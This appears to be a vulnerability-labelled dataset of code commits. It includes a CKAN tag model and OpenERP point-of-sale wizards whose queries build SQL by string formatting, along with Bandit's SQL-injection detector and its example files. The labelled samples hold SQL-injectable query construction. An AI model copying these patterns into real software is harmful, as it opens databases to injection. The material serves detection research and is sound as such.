class PackageRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Package', cascade=True)
    title = sqlobject.UnicodeCol(default=None)
    url = sqlobject.UnicodeCol(default=None)
    download_url = sqlobject.UnicodeCol(default=None)
    license = sqlobject.ForeignKey('License', default=None)
    notes = sqlobject.UnicodeCol(default=None)


class TagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Tag', cascade=True)


class PackageTagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('PackageTag', cascade=True)


class Package(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    
    name = sqlobject.UnicodeCol(alternateID=True)

    # should be attribute_name, module_name, module_object
    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]

    def add_tag_by_name(self, tagname):
        try:
            tag = self.revision.model.tags.get(tagname)
        except: # TODO: make this specific
            tag = self.transaction.model.tags.create(name=tagname)
        self.tags.create(tag=tag)


class Tag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = TagRevision

    name = sqlobject.UnicodeCol(alternateID=True)
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)

    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]

    @classmethod
    def search_by_name(self, text_query):
        text_query_str = str(text_query) # SQLObject chokes on unicode.
        # Todo: Change to use SQLObject statement objects.
        sql_query = ""UPPER(tag.name) LIKE UPPER('%%%s%%')"" % text_query_str
        return self.select(sql_query)


class PackageTag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageTagRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    m2m = []

    package = sqlobject.ForeignKey('Package', cascade=True)
    tag = sqlobject.ForeignKey('Tag', cascade=True)

    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',
            unique=True)

/n/n/n",1
36,36,b48fb1cde6b7bbc49f502974a034ee1cf7e87e6c,"addons/point_of_sale/wizard/pos_close_statement.py/n/n# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _

class pos_close_statement(osv.osv_memory):
    _name = 'pos.close.statement'
    _description = 'Close Statements'

    def close_statement(self, cr, uid, ids, context):
        """"""
             Close the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Dictionary
        """"""
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        statement_obj = self.pool.get('account.bank.statement')
        journal_obj = self.pool.get('account.journal')
        cr.execute(""""""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id""""""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        journal_ids = journal_obj.search(cr, uid, [('auto_cash', '=', True), ('type', '=', 'cash'), ('id', 'in', j_ids)])

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if not ids:
                raise osv.except_osv(_('Message'), _('Journals are already closed'))
            else:
                list_statement.append(ids[0])
                if not journal.check_dtls:
                    statement_obj.button_confirm_cash(cr, uid, ids, context)

        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id
        return {
                'domain': ""[('id','in',"" + str(list_statement) + "")]"",
                'name': 'Close Statements',
                'view_type': 'form',
                'view_mode': 'tree,form',
                'res_model': 'account.bank.statement',
                'views': [(id2, 'tree'),(id3, 'form')],
                'type': 'ir.actions.act_window'}

pos_close_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:
/n/n/naddons/point_of_sale/wizard/pos_open_statement.py/n/n# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _
import time

class pos_open_statement(osv.osv_memory):
    _name = 'pos.open.statement'
    _description = 'Open Statements'

    def open_statement(self, cr, uid, ids, context):
        """"""
             Open the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Directory
        """"""
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        statement_obj = self.pool.get('account.bank.statement')
        sequence_obj = self.pool.get('ir.sequence')
        journal_obj = self.pool.get('account.journal')
        cr.execute(""""""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id""""""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        journal_ids = journal_obj.search(cr, uid, [('auto_cash', '=', True), ('type', '=', 'cash'), ('id', 'in', j_ids)])

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if len(ids):
                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for ""%s"". \n Please close the cashbox related to. ' %(journal.name)))
            
            number = ''
            if journal.sequence_id:
                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)
            else:
                number = sequence_obj.get(cr, uid, 'account.bank.statement')
            
            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,
                                                          'company_id': company_id,
                                                          'user_id': uid,
                                                          'state': 'open',
                                                          'name': number,
                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),
                                                      })
            statement_obj.button_open(cr, uid, [statement_id], context)

        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id

        return {
            'domain': ""[('state','=','open')]"",
            'name': 'Open Statement',
            'view_type': 'form',
            'view_mode': 'tree,form',
            'res_model': 'account.bank.statement',
            'views': [(id2, 'tree'),(id3, 'form')],
            'type': 'ir.actions.act_window'
}
pos_open_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:
/n/n/n",0
37,37,b48fb1cde6b7bbc49f502974a034ee1cf7e87e6c,"/addons/point_of_sale/wizard/pos_close_statement.py/n/n# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _

class pos_close_statement(osv.osv_memory):
    _name = 'pos.close.statement'
    _description = 'Close Statements'

    def close_statement(self, cr, uid, ids, context):
        """"""
             Close the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Dictionary
        """"""
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        statement_obj = self.pool.get('account.bank.statement')
        journal_obj = self.pool.get('account.journal')
        cr.execute(""""""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id""""""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute("""""" select id from account_journal
                            where auto_cash='True' and type='cash'
                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))
        journal_ids = map(lambda x1: x1[0], cr.fetchall())

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if not ids:
                raise osv.except_osv(_('Message'), _('Journals are already closed'))
            else:
                list_statement.append(ids[0])
                if not journal.check_dtls:
                    statement_obj.button_confirm_cash(cr, uid, ids, context)
    #        if not list_statement:
    #            return {}
    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)
    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']

        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id
        return {
                'domain': ""[('id','in',"" + str(list_statement) + "")]"",
                'name': 'Close Statements',
                'view_type': 'form',
                'view_mode': 'tree,form',
                'res_model': 'account.bank.statement',
                'views': [(id2, 'tree'),(id3, 'form')],
                'type': 'ir.actions.act_window'}

pos_close_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:
/n/n/n/addons/point_of_sale/wizard/pos_open_statement.py/n/n# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _
import time

class pos_open_statement(osv.osv_memory):
    _name = 'pos.open.statement'
    _description = 'Open Statements'

    def open_statement(self, cr, uid, ids, context):
        """"""
             Open the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Directory
        """"""
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        statement_obj = self.pool.get('account.bank.statement')
        sequence_obj = self.pool.get('ir.sequence')
        journal_obj = self.pool.get('account.journal')
        cr.execute(""""""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id""""""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute("""""" select id from account_journal
                            where auto_cash='True' and type='cash'
                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))
        journal_ids = map(lambda x1: x1[0], cr.fetchall())

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if len(ids):
                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for ""%s"". \n Please close the cashbox related to. ' %(journal.name)))
            
#            cr.execute("""""" Select id from account_bank_statement
#                                    where journal_id =%d
#                                    and company_id =%d
#                                    order by id desc limit 1"""""" %(journal.id, company_id))
#            st_id = cr.fetchone()
            
            number = ''
            if journal.sequence_id:
                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)
            else:
                number = sequence_obj.get(cr, uid, 'account.bank.statement')
            
            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,
                                                          'company_id': company_id,
                                                          'user_id': uid,
                                                          'state': 'open',
                                                          'name': number,
                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),
                                                      })
            statement_obj.button_open(cr, uid, [statement_id], context)

    #            period = statement_obj._get_period(cr, uid, context) or None
    #            cr.execute(""INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')""%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))
    #            cr.commit()
    #            cr.execute(""select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'""%(journal.id, company_id, uid, number))
    #            statement_id = cr.fetchone()[0]
    #            print ""statement_id"",statement_id
    #            if st_id:
    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])
    #                list_statement.append(statemt_id.id)
    #                if statemt_id and statemt_id.ending_details_ids:
    #                    statement_obj.write(cr, uid, [statement_id], {
    #                        'balance_start': statemt_id.balance_end,
    #                        'state': 'open',
    #                    })
    #                    if statemt_id.ending_details_ids:
    #                        for i in statemt_id.ending_details_ids:
    #                            c = statement_obj.create(cr, uid, {
    #                                'pieces': i.pieces,
    #                                'number': i.number,
    #                                'starting_id': statement_id,
    #                            })
        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id

        return {
#           'domain': ""[('id','in', [""+','.join(map(str,list_statement))+""])]"",
            'domain': ""[('state','=','open')]"",
            'name': 'Open Statement',
            'view_type': 'form',
            'view_mode': 'tree,form',
            'res_model': 'account.bank.statement',
            'views': [(id2, 'tree'),(id3, 'form')],
            'type': 'ir.actions.act_window'
}
pos_open_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:
/n/n/n",1
24,24,6ce60806ca8a44d8a8b37050539e2b2f9a54b847,"bandit/plugins/injection_sql.py/n/n# -*- coding:utf-8 -*-
#
# Copyright 2014 Hewlett-Packard Development Company, L.P.
#
# Licensed under the Apache License, Version 2.0 (the ""License""); you may
# not use this file except in compliance with the License. You may obtain
# a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.

r""""""
============================
B608: Test for SQL injection
============================

An SQL injection attack consists of insertion or ""injection"" of a SQL query via
the input data given to an application. It is a very common attack vector. This
plugin test looks for strings that resemble SQL statements that are involved in
some form of string building operation. For example:

 - ""SELECT %s FROM derp;"" % var
 - ""SELECT thing FROM "" + tab
 - ""SELECT "" + val + "" FROM "" + tab + ...
 - ""SELECT {} FROM derp;"".format(var)

Unless care is taken to sanitize and control the input data when building such
SQL statement strings, an injection attack becomes possible. If strings of this
nature are discovered, a LOW confidence issue is reported. In order to boost
result confidence, this plugin test will also check to see if the discovered
string is in use with standard Python DBAPI calls `execute` or `executemany`.
If so, a MEDIUM issue is reported. For example:

 - cursor.execute(""SELECT %s FROM derp;"" % var)


:Example:

.. code-block:: none

    >> Issue: Possible SQL injection vector through string-based query
    construction.
       Severity: Medium   Confidence: Low
       Location: ./examples/sql_statements_without_sql_alchemy.py:4
    3 query = ""DELETE FROM foo WHERE id = '%s'"" % identifier
    4 query = ""UPDATE foo SET value = 'b' WHERE id = '%s'"" % identifier
    5

.. seealso::

 - https://www.owasp.org/index.php/SQL_Injection
 - https://security.openstack.org/guidelines/dg_parameterize-database-queries.html  # noqa

.. versionadded:: 0.9.0

""""""

import ast
import re

import bandit
from bandit.core import test_properties as test
from bandit.core import utils

SIMPLE_SQL_RE = re.compile(
    r'(select\s.*from\s|'
    r'delete\s+from\s|'
    r'insert\s+into\s.*values\s|'
    r'update\s.*set\s)',
    re.IGNORECASE | re.DOTALL,
)


def _check_string(data):
    return SIMPLE_SQL_RE.search(data) is not None


def _evaluate_ast(node):
    wrapper = None
    statement = ''

    if isinstance(node.parent, ast.BinOp):
        out = utils.concat_string(node, node.parent)
        wrapper = out[0].parent
        statement = out[1]
    elif (isinstance(node.parent, ast.Attribute)
          and node.parent.attr == 'format'):
        statement = node.s
        # Hierarchy for """".format() is Wrapper -> Call -> Attribute -> Str
        wrapper = node.parent.parent.parent

    if isinstance(wrapper, ast.Call):  # wrapped in ""execute"" call?
        names = ['execute', 'executemany']
        name = utils.get_called_name(wrapper)
        return (name in names, statement)
    else:
        return (False, statement)


@test.checks('Str')
@test.test_id('B608')
def hardcoded_sql_expressions(context):
    val = _evaluate_ast(context.node)
    if _check_string(val[1]):
        return bandit.Issue(
            severity=bandit.MEDIUM,
            confidence=bandit.MEDIUM if val[0] else bandit.LOW,
            text=""Possible SQL injection vector through string-based ""
                 ""query construction.""
        )
/n/n/nexamples/sql_statements.py/n/nimport sqlalchemy

# bad
query = ""SELECT * FROM foo WHERE id = '%s'"" % identifier
query = ""INSERT INTO foo VALUES ('a', 'b', '%s')"" % value
query = ""DELETE FROM foo WHERE id = '%s'"" % identifier
query = ""UPDATE foo SET value = 'b' WHERE id = '%s'"" % identifier
query = """"""WITH cte AS (SELECT x FROM foo)
SELECT x FROM cte WHERE x = '%s'"""""" % identifier
# bad alternate forms
query = ""SELECT * FROM foo WHERE id = '"" + identifier + ""'""
query = ""SELECT * FROM foo WHERE id = '{}'"".format(identifier)

# bad
cur.execute(""SELECT * FROM foo WHERE id = '%s'"" % identifier)
cur.execute(""INSERT INTO foo VALUES ('a', 'b', '%s')"" % value)
cur.execute(""DELETE FROM foo WHERE id = '%s'"" % identifier)
cur.execute(""UPDATE foo SET value = 'b' WHERE id = '%s'"" % identifier)
# bad alternate forms
cur.execute(""SELECT * FROM foo WHERE id = '"" + identifier + ""'"")
cur.execute(""SELECT * FROM foo WHERE id = '{}'"".format(identifier))

# good
cur.execute(""SELECT * FROM foo WHERE id = '%s'"", identifier)
cur.execute(""INSERT INTO foo VALUES ('a', 'b', '%s')"", value)
cur.execute(""DELETE FROM foo WHERE id = '%s'"", identifier)
cur.execute(""UPDATE foo SET value = 'b' WHERE id = '%s'"", identifier)

# bug: https://bugs.launchpad.net/bandit/+bug/1479625
def a():
    def b():
        pass
    return b

a()(""SELECT %s FROM foo"" % val)

# real world false positives
choices=[('server_list', _(""Select from active instances""))]
print(""delete from the cache as the first argument"")
/n/n/ntests/functional/test_functional.py/n/n# -*- coding:utf-8 -*-
#
# Copyright 2014 Hewlett-Packard Development Company, L.P.
#
# Licensed under the Apache License, Version 2.0 (the ""License""); you may
# not use this file except in compliance with the License. You may obtain
# a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.

import os

import six
import testtools

from bandit.core import config as b_config
from bandit.core import constants as C
from bandit.core import manager as b_manager
from bandit.core import metrics
from bandit.core import test_set as b_test_set


class FunctionalTests(testtools.TestCase):

    '''Functional tests for bandit test plugins.

    This set of tests runs bandit against each example file in turn
    and records the score returned. This is compared to a known good value.
    When new tests are added to an example the expected result should be
    adjusted to match.
    '''

    def setUp(self):
        super(FunctionalTests, self).setUp()
        # NOTE(tkelsey): bandit is very sensitive to paths, so stitch
        # them up here for the testing environment.
        #
        path = os.path.join(os.getcwd(), 'bandit', 'plugins')
        b_conf = b_config.BanditConfig()
        self.b_mgr = b_manager.BanditManager(b_conf, 'file')
        self.b_mgr.b_conf._settings['plugins_dir'] = path
        self.b_mgr.b_ts = b_test_set.BanditTestSet(config=b_conf)

    def run_example(self, example_script, ignore_nosec=False):
        '''A helper method to run the specified test

        This method runs the test, which populates the self.b_mgr.scores
        value. Call this directly if you need to run a test, but do not
        need to test the resulting scores against specified values.
        :param example_script: Filename of an example script to test
        '''
        path = os.path.join(os.getcwd(), 'examples', example_script)
        self.b_mgr.ignore_nosec = ignore_nosec
        self.b_mgr.discover_files([path], True)
        self.b_mgr.run_tests()

    def check_example(self, example_script, expect, ignore_nosec=False):
        '''A helper method to test the scores for example scripts.

        :param example_script: Filename of an example script to test
        :param expect: dict with expected counts of issue types
        '''
        # reset scores for subsequent calls to check_example
        self.b_mgr.scores = []
        self.run_example(example_script, ignore_nosec=ignore_nosec)
        expected = 0
        result = 0
        for test_scores in self.b_mgr.scores:
            for score_type in test_scores:
                self.assertIn(score_type, expect)
                for rating in expect[score_type]:
                    expected += (
                        expect[score_type][rating] * C.RANKING_VALUES[rating]
                    )
                result += sum(test_scores[score_type])
        self.assertEqual(expected, result)

    def check_metrics(self, example_script, expect):
        '''A helper method to test the metrics being returned.

        :param example_script: Filename of an example script to test
        :param expect: dict with expected values of metrics
        '''
        self.b_mgr.metrics = metrics.Metrics()
        self.b_mgr.scores = []
        self.run_example(example_script)

        # test general metrics (excludes issue counts)
        m = self.b_mgr.metrics.data
        for k in expect:
            if k != 'issues':
                self.assertEqual(expect[k], m['_totals'][k])
        # test issue counts
        if 'issues' in expect:
            for (criteria, default) in C.CRITERIA:
                for rank in C.RANKING:
                    label = '{0}.{1}'.format(criteria, rank)
                    expected = 0
                    if expect['issues'].get(criteria, None).get(rank, None):
                        expected = expect['issues'][criteria][rank]
                    self.assertEqual(expected, m['_totals'][label])

    def test_binding(self):
        '''Test the bind-to-0.0.0.0 example.'''
        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'MEDIUM': 1}}
        self.check_example('binding.py', expect)

    def test_crypto_md5(self):
        '''Test the `hashlib.md5` example.'''
        expect = {'SEVERITY': {'MEDIUM': 11},
                  'CONFIDENCE': {'HIGH': 11}}
        self.check_example('crypto-md5.py', expect)

    def test_ciphers(self):
        '''Test the `Crypto.Cipher` example.'''
        expect = {'SEVERITY': {'HIGH': 13},
                  'CONFIDENCE': {'HIGH': 13}}
        self.check_example('ciphers.py', expect)

    def test_cipher_modes(self):
        '''Test for insecure cipher modes.'''
        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example('cipher-modes.py', expect)

    def test_eval(self):
        '''Test the `eval` example.'''
        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('eval.py', expect)

    def test_mark_safe(self):
        '''Test the `mark_safe` example.'''
        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example('mark_safe.py', expect)

    def test_exec(self):
        '''Test the `exec` example.'''
        filename = 'exec-{}.py'
        if six.PY2:
            filename = filename.format('py2')
            expect = {'SEVERITY': {'MEDIUM': 2}, 'CONFIDENCE': {'HIGH': 2}}
        else:
            filename = filename.format('py3')
            expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example(filename, expect)

    def test_exec_as_root(self):
        '''Test for the `run_as_root=True` keyword argument.'''
        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'MEDIUM': 5}}
        self.check_example('exec-as-root.py', expect)

    def test_hardcoded_passwords(self):
        '''Test for hard-coded passwords.'''
        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'MEDIUM': 7}}
        self.check_example('hardcoded-passwords.py', expect)

    def test_hardcoded_tmp(self):
        '''Test for hard-coded /tmp, /var/tmp, /dev/shm.'''
        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'MEDIUM': 3}}
        self.check_example('hardcoded-tmp.py', expect)

    def test_httplib_https(self):
        '''Test for `httplib.HTTPSConnection`.'''
        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('httplib_https.py', expect)

    def test_imports_aliases(self):
        '''Test the `import X as Y` syntax.'''
        expect = {
            'SEVERITY': {'LOW': 4, 'MEDIUM': 5, 'HIGH': 0},
            'CONFIDENCE': {'HIGH': 9}
        }
        self.check_example('imports-aliases.py', expect)

    def test_imports_from(self):
        '''Test the `from X import Y` syntax.'''
        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('imports-from.py', expect)

    def test_imports_function(self):
        '''Test the `__import__` function.'''
        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('imports-function.py', expect)

    def test_telnet_usage(self):
        '''Test for `import telnetlib` and Telnet.* calls.'''
        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('telnetlib.py', expect)

    def test_ftp_usage(self):
        '''Test for `import ftplib` and FTP.* calls.'''
        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('ftplib.py', expect)

    def test_imports(self):
        '''Test for dangerous imports.'''
        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('imports.py', expect)

    def test_mktemp(self):
        '''Test for `tempfile.mktemp`.'''
        expect = {'SEVERITY': {'MEDIUM': 4}, 'CONFIDENCE': {'HIGH': 4}}
        self.check_example('mktemp.py', expect)

    def test_nonsense(self):
        '''Test that a syntactically invalid module is skipped.'''
        self.run_example('nonsense.py')
        self.assertEqual(1, len(self.b_mgr.skipped))

    def test_okay(self):
        '''Test a vulnerability-free file.'''
        expect = {'SEVERITY': {}, 'CONFIDENCE': {}}
        self.check_example('okay.py', expect)

    def test_os_chmod(self):
        '''Test setting file permissions.'''
        filename = 'os-chmod-{}.py'
        if six.PY2:
            filename = filename.format('py2')
        else:
            filename = filename.format('py3')
        expect = {
            'SEVERITY': {'MEDIUM': 2, 'HIGH': 8},
            'CONFIDENCE': {'MEDIUM': 1, 'HIGH': 9}
        }
        self.check_example(filename, expect)

    def test_os_exec(self):
        '''Test for `os.exec*`.'''
        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}
        self.check_example('os-exec.py', expect)

    def test_os_popen(self):
        '''Test for `os.popen`.'''
        expect = {'SEVERITY': {'LOW': 8, 'MEDIUM': 0, 'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 9}}
        self.check_example('os-popen.py', expect)

    def test_os_spawn(self):
        '''Test for `os.spawn*`.'''
        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}
        self.check_example('os-spawn.py', expect)

    def test_os_startfile(self):
        '''Test for `os.startfile`.'''
        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'MEDIUM': 3}}
        self.check_example('os-startfile.py', expect)

    def test_os_system(self):
        '''Test for `os.system`.'''
        expect = {'SEVERITY': {'LOW': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example('os_system.py', expect)

    def test_pickle(self):
        '''Test for the `pickle` module.'''
        expect = {
            'SEVERITY': {'LOW': 2, 'MEDIUM': 6},
            'CONFIDENCE': {'HIGH': 8}
        }
        self.check_example('pickle_deserialize.py', expect)

    def test_popen_wrappers(self):
        '''Test the `popen2` and `commands` modules.'''
        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}
        self.check_example('popen_wrappers.py', expect)

    def test_random_module(self):
        '''Test for the `random` module.'''
        expect = {'SEVERITY': {'LOW': 6}, 'CONFIDENCE': {'HIGH': 6}}
        self.check_example('random_module.py', expect)

    def test_requests_ssl_verify_disabled(self):
        '''Test for the `requests` library skipping verification.'''
        expect = {'SEVERITY': {'HIGH': 7}, 'CONFIDENCE': {'HIGH': 7}}
        self.check_example('requests-ssl-verify-disabled.py', expect)

    def test_skip(self):
        '''Test `#nosec` and `#noqa` comments.'''
        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'HIGH': 5}}
        self.check_example('skip.py', expect)

    def test_ignore_skip(self):
        '''Test --ignore-nosec flag.'''
        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}
        self.check_example('skip.py', expect, ignore_nosec=True)

    def test_sql_statements(self):
        '''Test for SQL injection through string building.'''
        expect = {
            'SEVERITY': {'MEDIUM': 14},
            'CONFIDENCE': {'LOW': 8, 'MEDIUM': 6}}
        self.check_example('sql_statements.py', expect)

